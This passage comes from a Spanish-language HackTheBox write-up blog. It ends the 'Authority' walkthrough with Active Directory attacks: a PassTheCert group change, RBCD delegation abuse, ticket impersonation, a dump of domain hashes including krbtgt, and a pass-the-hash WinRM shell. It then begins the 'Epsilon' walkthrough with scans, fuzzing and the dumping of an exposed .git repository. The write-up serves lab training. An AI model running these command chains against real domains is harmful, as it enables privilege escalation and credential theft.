</code></pre></div></div>

<ul>
  <li>
    <p>Ahora usamos la herramienta.</p>
  </li>
  <li>
    <p>Lo que estamos haciendo es a√±adiendo al usuario svc_ldap al grupo Administrators.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ python3 /opt/PassTheCert/Python/passthecert.py <span class="nt">-action</span> ldap-shell <span class="nt">-crt</span> administrator.crt <span class="nt">-key</span> administrator.key <span class="nt">-domain</span> authority.htb <span class="nt">-dc-ip</span> 10.10.11.222
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

Type <span class="nb">help </span><span class="k">for </span>list of commands

<span class="c"># help</span>

 add_computer computer <span class="o">[</span>password] <span class="o">[</span>nospns] - Adds a new computer to the domain with the specified password. If nospns is specified, computer will be created with only a single necessary HOST SPN. Requires LDAPS.
 rename_computer current_name new_name - Sets the SAMAccountName attribute on a computer object to a new value.
 add_user new_user <span class="o">[</span>parent] - Creates a new user.
 add_user_to_group user group - Adds a user to a group.
 change_password user <span class="o">[</span>password] - Attempt to change a given user<span class="s1">'s password. Requires LDAPS.
 clear_rbcd target - Clear the resource based constrained delegation configuration information.
 disable_account user - Disable the user'</span>s account.
 enable_account user - Enable the user<span class="s1">'s account.
 dump - Dumps the domain.
 search query [attributes,] - Search users and groups by name, distinguishedName and sAMAccountName.
 get_user_groups user - Retrieves all groups this user is a member of.
 get_group_users group - Retrieves all members of a group.
 get_laps_password computer - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).
 grant_control target grantee - Grant full control of a given target object (sAMAccountName) to the grantee (sAMAccountName).
 set_dontreqpreauth user true/false - Set the don'</span>t require pre-authentication flag to <span class="nb">true </span>or false.
 set_rbcd target grantee - Grant the grantee <span class="o">(</span>sAMAccountName<span class="o">)</span> the ability to perform RBCD to the target <span class="o">(</span>sAMAccountName<span class="o">)</span><span class="nb">.</span>
 start_tls - Send a StartTLS <span class="nb">command </span>to upgrade from LDAP to LDAPS. Use this to bypass channel binding <span class="k">for </span>operations necessitating an encrypted channel.
 write_gpo_dacl user gpoSID - Write a full control ACE to the gpo <span class="k">for </span>the given user. The gpoSID must be entered surrounding by <span class="o">{}</span><span class="nb">.</span>
 <span class="nb">exit</span> - Terminates this session.

<span class="c"># add_user_to_group svc_ldap administrators</span>
Adding user: svc_ldap to group Administrators result: OK
</code></pre></div></div>

<ul>
  <li>Ahora podemos dumpear los hashes como el del administrador para conectarnos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ crackmapexec smb 10.10.11.222 <span class="nt">-u</span> svc_ldap <span class="nt">-p</span> <span class="s1">'lDaP_1n_th3_cle4r!'</span> <span class="nt">--sam</span>
SMB         10.10.11.222    445    AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.222    445    AUTHORITY        <span class="o">[</span>+] authority.htb<span class="se">\s</span>vc_ldap:lDaP_1n_th3_cle4r! <span class="o">(</span>Pwn3d!<span class="o">)</span>
SMB         10.10.11.222    445    AUTHORITY        <span class="o">[</span>+] Dumping SAM hashes
SMB         10.10.11.222    445    AUTHORITY        Administrator:500:aad3b435b51404eeaad3b435b51404ee:a15217bb5af3046c87b5bb6afa7b193e:::
SMB         10.10.11.222    445    AUTHORITY        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.11.222    445    AUTHORITY        DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
ERROR:root:SAM hashes extraction <span class="k">for </span>user WDAGUtilityAccount failed. The account doesn<span class="s1">'t have hash information.
SMB         10.10.11.222    445    AUTHORITY        [+] Added 3 SAM hashes to the database
</span></code></pre></div></div>

<ul>
  <li>
    <p>Por alguna raz√≥n el hash que nos da <code class="language-plaintext highlighter-rouge">crackmapexec</code> no es correcto pero podemos solicitarlo de otra forma.</p>
  </li>
  <li>
    <p>Vamos a usar write_rbcd para darle permisos de <code class="language-plaintext highlighter-rouge">delegration</code> sobre el DC.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ python3 /opt/PassTheCert/Python/passthecert.py <span class="nt">-action</span> write_rbcd <span class="nt">-delegate-to</span> <span class="s1">'AUTHORITY$'</span> <span class="nt">-delegate-from</span> <span class="s1">'miguel$'</span> <span class="nt">-crt</span> administrator.crt <span class="nt">-key</span> administrator.key <span class="nt">-domain</span> authority.htb <span class="nt">-dc-ip</span> 10.10.11.222
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Delegation rights modified successfully!
<span class="o">[</span><span class="k">*</span><span class="o">]</span> miguel<span class="nv">$ </span>can now impersonate <span class="nb">users </span>on AUTHORITY<span class="nv">$ </span>via S4U2Proxy
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Accounts allowed to act on behalf of other identity:
<span class="o">[</span><span class="k">*</span><span class="o">]</span>     miguel<span class="nv">$ </span>     <span class="o">(</span>S-1-5-21-622327497-3269355298-2248959698-11602<span class="o">)</span>
</code></pre></div></div>

<blockquote>
  <p>Se refiere a la capacidad de un usuario, grupo o computadora para delegar su autoridad o permisos a otro usuario, grupo o computadora. Esto es especialmente relevante en entornos de red y dominio donde es com√∫n delegar ciertos permisos administrativos a usuarios o equipos espec√≠ficos para realizar tareas espec√≠ficas sin otorgar acceso completo.</p>
</blockquote>

<ul>
  <li>Ahora obtenemos el ticket.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ impacket-getST <span class="nt">-spn</span> <span class="s1">'cifs/AUTHORITY.AUTHORITY.HTB'</span> <span class="nt">-impersonate</span> Administrator <span class="s1">'authority.htb/miguel$:miguel123'</span>
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

<span class="o">[</span>-] CCache file is not found. Skipping...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting TGT <span class="k">for </span>user
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Impersonating Administrator
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting S4U2self
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting S4U2Proxy
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving ticket <span class="k">in </span>Administrator@cifs_AUTHORITY.AUTHORITY.HTB@AUTHORITY.HTB.ccache
</code></pre></div></div>

<ul>
  <li>Y ahora si obtenemos los hashes.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ <span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator@cifs_AUTHORITY.AUTHORITY.HTB@AUTHORITY.HTB.ccache impacket-secretsdump <span class="nt">-k</span> <span class="nt">-no-pass</span> authority.htb/administrator@authority.authority.htb <span class="nt">-just-dc-ntlm</span>
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span><span class="nb">id</span>:rid:lmhash:nthash<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bd6bd7fcab60ba569e3ed57c7c322908:::
svc_ldap:1601:aad3b435b51404eeaad3b435b51404ee:6839f4ed6c7e142fed7988a6c5d0c5f1:::
AUTHORITY<span class="nv">$:</span>1000:aad3b435b51404eeaad3b435b51404ee:42e6e4d7486c17cbc44fd23c758d39d1:::
miguel<span class="nv">$:</span>11602:aad3b435b51404eeaad3b435b51404ee:0ddc9e8df3c8843f75a918df65dda6ee:::
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Cleaning up...
</code></pre></div></div>

<ul>
  <li>Ahora si ya nos pudimos conectar.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ evil-winrm <span class="nt">-i</span> authority.htb <span class="nt">-u</span> administrator <span class="nt">-H</span> 6961f422924da90a6928197429eea4ed

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>htb<span class="se">\a</span>dministrator
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Epsilon (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/07/04/epsilon.html" rel="alternate" type="text/html" title="HackTheBox - Epsilon (medium)" /><published>2024-07-04T00:00:00-06:00</published><updated>2024-07-04T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/07/04/epsilon</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/07/04/epsilon.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/16ed7466c1f37757e15bd7e37668d243.png" />
</p>

<ul>
  <li>Epsilon is a medium difficulty Linux machine which exposes a Git repository on the webserver. AWS credentials are leaked in Git commits, which allows downloading the AWS Lambda function code. Secret key found in the source code can be used to forge a cookie to gain access to the web application. Foothold is obtained by exploiting the Server Side Template Injection vulnerability in the application feature. Abusing the tar symlink in a cronjob gives root access.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80,5000 10.10.11.134 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-07-04 18:13 CST
Nmap scan report <span class="k">for </span>10.10.11.134
Host is up <span class="o">(</span>0.10s latency<span class="o">)</span><span class="nb">.</span>

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae <span class="o">(</span>RSA<span class="o">)</span>
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp   open  http    Apache httpd 2.4.41
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
| http-git:
|   10.10.11.134:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository<span class="p">;</span> edit this file <span class="s1">'description'</span> to name the...
|_    Last commit message: Updating Tracking API  <span class="c"># Please enter the commit message for...</span>
5000/tcp open  http    Werkzeug httpd 2.0.2 <span class="o">(</span>Python 3.8.10<span class="o">)</span>
|_http-title: Costume Shop
|_http-server-header: Werkzeug/2.0.2 Python/3.8.10
Service Info: Host: 127.0.1.1<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>

<h2 id="enumeraci√≥n">Enumeraci√≥n</h2>

<ul>
  <li>En la pagina web principal obtenemos un c√≥digo de estado <code class="language-plaintext highlighter-rouge">403</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ curl <span class="nt">-s</span> http://10.10.11.134
&lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//IETF//DTD HTML 2.0//EN"</span><span class="o">&gt;</span>
&lt;html&gt;&lt;<span class="nb">head</span><span class="o">&gt;</span>
&lt;title&gt;403 Forbidden&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Forbidden&lt;/h1&gt;
&lt;p&gt;You don<span class="s1">'t have permission to access this resource.&lt;/p&gt;
&lt;hr&gt;
&lt;address&gt;Apache/2.4.41 (Ubuntu) Server at 10.10.11.134 Port 80&lt;/address&gt;
&lt;/body&gt;&lt;/html&gt;
</span></code></pre></div></div>

<ul>
  <li>Si lo hacemos al puerto 5000 si nos responde.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ curl <span class="nt">-s</span> http://10.10.11.134:5000


&lt;<span class="o">!</span>DOCTYPE html&gt;
&lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">"en"</span> <span class="o">&gt;</span>

&lt;<span class="nb">head</span><span class="o">&gt;</span>

  &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"UTF-8"</span><span class="o">&gt;</span>

  &lt;title&gt;Costume Shop&lt;/title&gt;
</code></pre></div></div>

<ul>
  <li>Como vemos no tenemos acceso.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/1.png" />
</p>

<ul>
  <li>En el puerto 5000 si podemos ver la web.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/2.png" />
</p>

<ul>
  <li>Despu√©s de probar varias <code class="language-plaintext highlighter-rouge">querys</code> para ver si es vulnerable a una <code class="language-plaintext highlighter-rouge">SQL Injection</code> no tuve √©xito, <code class="language-plaintext highlighter-rouge">Nmap</code> nos reporto un <code class="language-plaintext highlighter-rouge">.git</code> pero antes vamos a hacer <code class="language-plaintext highlighter-rouge">fuzzing</code> para ver si encontramos algo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ feroxbuster <span class="nt">-u</span> http://10.10.11.134:5000

 ___  ___  __   __     __      __         __   ___
|__  |__  |__<span class="o">)</span> |__<span class="o">)</span> | /  <span class="sb">`</span>    /  <span class="se">\ \_</span>/ | |  <span class="se">\ </span>|__
|    |___ |  <span class="se">\ </span>|  <span class="se">\ </span>| <span class="se">\_</span>_,    <span class="se">\_</span>_/ / <span class="se">\ </span>| |__/ |___
by Ben <span class="s2">"epi"</span> Risher ü§ì                 ver: 2.10.3
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üéØ  Target Url            ‚îÇ http://10.10.11.134:5000
 üöÄ  Threads               ‚îÇ 50
 üìñ  Wordlist              ‚îÇ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 üëå  Status Codes          ‚îÇ All Status Codes!
 üí•  Timeout <span class="o">(</span>secs<span class="o">)</span>        ‚îÇ 7
 ü¶°  User-Agent            ‚îÇ feroxbuster/2.10.3
 üíâ  Config File           ‚îÇ /etc/feroxbuster/ferox-config.toml
 üîé  Extract Links         ‚îÇ <span class="nb">true</span>
 üèÅ  HTTP methods          ‚îÇ <span class="o">[</span>GET]
 üîÉ  Recursion Depth       ‚îÇ 4
 üéâ  New Version Available ‚îÇ https://github.com/epi052/feroxbuster/releases/latest
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üèÅ  Press <span class="o">[</span>ENTER] to use the Scan Management Menu‚Ñ¢
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
404      GET        4l       34w      232c Auto-filtering found 404-like response and created new filter<span class="p">;</span> toggle off with <span class="nt">--dont-filter</span>
302      GET        4l       24w      208c http://10.10.11.134:5000/home <span class="o">=&gt;</span> http://10.10.11.134:5000/
200      GET      545l     2833w   217381c http://10.10.11.134:5000/static/img/costume.jpg
200      GET      205l      358w     3550c http://10.10.11.134:5000/
302      GET        4l       24w      208c http://10.10.11.134:5000/order <span class="o">=&gt;</span> http://10.10.11.134:5000/
200      GET      234l      454w     4288c http://10.10.11.134:5000/track
200      GET      565l     3002w   320823c http://10.10.11.134:5000/static/img/ico.png
<span class="o">[</span><span class="c">####################] - 3m     30006/30006   0s      found:6       errors:3</span>
<span class="o">[</span><span class="c">####################] - 3m     30000/30000   187/s   http://10.10.11.134:5000/ </span>
</code></pre></div></div>

<ul>
  <li>
    <p>Las rutas order y track son interesantes as√≠ que vamos a ir a track.</p>
  </li>
  <li>
    <p>Estamos como el Admin.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/3.png" />
</p>

<ul>
  <li>Si ponemos cualquier numero en el campo ID nos redirige al panel de login eso quiere decir que debemos estar logeados correctamente para acceder.</li>
</ul>

<h2 id="git-enumeration">Git Enumeration</h2>

<ul>
  <li>Como vimos el <code class="language-plaintext highlighter-rouge">.git</code> expuesto vamos a enumerarlo <a href="https://pypi.org/project/git-dumper/">https://pypi.org/project/git-dumper/</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ git-dumper http://10.10.11.134/.git <span class="nb">.</span>
<span class="o">[</span>-] Testing http://10.10.11.134/.git/HEAD <span class="o">[</span>200]
<span class="o">[</span>-] Testing http://10.10.11.134/.git/ <span class="o">[</span>403]
<span class="o">[</span>-] Fetching common files
<span class="o">[</span>-] Fetching http://10.10.11.134/.gitignore <span class="o">[</span>404]
<span class="o">[</span>-] http://10.10.11.134/.gitignore responded with status code 404
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/description <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/hooks/commit-msg.sample <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/hooks/applypatch-msg.sample <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/COMMIT_EDITMSG <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/hooks/post-commit.sample <span class="o">[</span>404]
<span class="o">[</span>-] http://10.10.11.134/.git/hooks/post-commit.sample responded with status code 404
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/hooks/post-receive.sample <span class="o">[</span>404]
<span class="o">[</span>-] http://10.10.11.134/.git/hooks/post-receive.sample responded with status code 404
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/hooks/pre-rebase.sample <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/hooks/update.sample <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/hooks/prepare-commit-msg.sample <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/hooks/post-update.sample <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/hooks/pre-receive.sample <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/hooks/pre-applypatch.sample <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/info/packs <span class="o">[</span>404]
<span class="o">[</span>-] http://10.10.11.134/.git/objects/info/packs responded with status code 404
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/hooks/pre-commit.sample <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/hooks/pre-push.sample <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/info/exclude <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/index <span class="o">[</span>200]
<span class="o">[</span>-] Finding refs/
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/FETCH_HEAD <span class="o">[</span>404]
<span class="o">[</span>-] http://10.10.11.134/.git/FETCH_HEAD responded with status code 404
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/ORIG_HEAD <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/HEAD <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/info/refs <span class="o">[</span>404]
<span class="o">[</span>-] http://10.10.11.134/.git/info/refs responded with status code 404
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/config <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/logs/refs/heads/master <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/logs/refs/remotes/origin/HEAD <span class="o">[</span>404]
<span class="o">[</span>-] http://10.10.11.134/.git/logs/refs/remotes/origin/HEAD responded with status code 404
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/logs/HEAD <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/logs/refs/stash <span class="o">[</span>404]
<span class="o">[</span>-] http://10.10.11.134/.git/logs/refs/stash responded with status code 404
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/packed-refs <span class="o">[</span>404]
<span class="o">[</span>-] http://10.10.11.134/.git/packed-refs responded with status code 404
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/refs/heads/master <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/refs/remotes/origin/HEAD <span class="o">[</span>404]
<span class="o">[</span>-] http://10.10.11.134/.git/refs/remotes/origin/HEAD responded with status code 404
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/refs/remotes/origin/master <span class="o">[</span>404]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/refs/stash <span class="o">[</span>404]
<span class="o">[</span>-] http://10.10.11.134/.git/refs/stash responded with status code 404
<span class="o">[</span>-] http://10.10.11.134/.git/refs/remotes/origin/master responded with status code 404
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/refs/wip/wtree/refs/heads/master <span class="o">[</span>404]
<span class="o">[</span>-] http://10.10.11.134/.git/refs/wip/wtree/refs/heads/master responded with status code 404
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/refs/wip/index/refs/heads/master <span class="o">[</span>404]
<span class="o">[</span>-] http://10.10.11.134/.git/refs/wip/index/refs/heads/master responded with status code 404
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/logs/refs/remotes/origin/master <span class="o">[</span>404]
<span class="o">[</span>-] http://10.10.11.134/.git/logs/refs/remotes/origin/master responded with status code 404
<span class="o">[</span>-] Finding packs
<span class="o">[</span>-] Finding objects
<span class="o">[</span>-] Fetching objects
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/c6/22771686bd74c16ece91193d29f85b5f9ffa91 <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/b1/0dd06d56ac760efbbb5d254ea43bf9beb56d2d <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/df/dfa17ca5701b1dca5069b6c3f705a038f4361e <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/c5/1441640fd25e9fba42725147595b5918eba0f1 <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/5c/52105750831385d4756111e1103957ac599d02 <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/8d/3b52e153c7d5380b183bbbb51f5d4020944630 <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/ce/401ccecf421ff19bf43fafe8a60a0d0f0682d0 <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/00/00000000000000000000000000000000000000 <span class="o">[</span>404]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/7c/f92a7a09e523c1c667d13847c9ba22464412f3 <span class="o">[</span>200]
<span class="o">[</span>-] http://10.10.11.134/.git/objects/00/00000000000000000000000000000000000000 responded with status code 404
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/65/b80f62da28254f67f0bea392057fd7d2330e2d <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/cf/489a3776d2bf87ac32de4579e852a4dc116ce8 <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/ab/07f7cdc7f410b8c8f848ee5674ec550ecb61ca <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/b5/f4c99c772eeb629e53d284275458d75ed9a010 <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/54/5f6fe2204336c1ea21720cbaa47572eb566e34 <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/fe/d7ab97cf361914f688f0e4f2d3adfafd1d7dca <span class="o">[</span>200]
<span class="o">[</span>-] Running git checkout <span class="nb">.</span>
</code></pre></div></div>

<ul>
  <li>Existe otra herramienta que se llama GitHack <a href="https://github.com/lijiejie/GitHack/tree/master">https://github.com/lijiejie/GitHack/tree/master</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ pip3 <span class="nb">install </span>GitHack
Defaulting to user installation because normal site-packages is not writeable
Collecting GitHack
  Downloading githack-0.0.4.post1-py3-none-any.whl.metadata <span class="o">(</span>2.0 kB<span class="o">)</span>
Downloading githack-0.0.4.post1-py3-none-any.whl <span class="o">(</span>54 kB<span class="o">)</span>
   ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ 54.2/54.2 kB 579.0 kB/s eta 0:00:00
Installing collected packages: GitHack
Successfully installed GitHack-0.0.4.post1
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ githack http://10.10.11.134/.git/
</code></pre></div></div>

<ul>
  <li>Tenemos el proyecto.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ <span class="nb">ls</span> <span class="nt">-la</span>
total 20
drwxr-xr-x 3 miguel miguel 4096 Jul  4 18:31 <span class="nb">.</span>
drwxr-xr-x 6 miguel miguel 4096 Jul  4 18:09 ..
drwxr-xr-x 7 miguel miguel 4096 Jul  4 18:31 .git
<span class="nt">-rw-r--r--</span> 1 miguel miguel 1670 Jul  4 18:31 server.py
<span class="nt">-rw-r--r--</span> 1 miguel miguel 1099 Jul  4 18:31 track_api_CR_148.py
</code></pre></div></div>

<ul>
  <li>Este es el c√≥digo en Python3 donde corre el puerto <code class="language-plaintext highlighter-rouge">5000</code>.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">import</span> <span class="n">jwt</span>
<span class="kn">from</span> <span class="n">flask</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">app</span> <span class="o">=</span> <span class="nc">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
<span class="n">secret</span> <span class="o">=</span> <span class="sh">'</span><span class="s">&lt;secret_key&gt;</span><span class="sh">'</span>

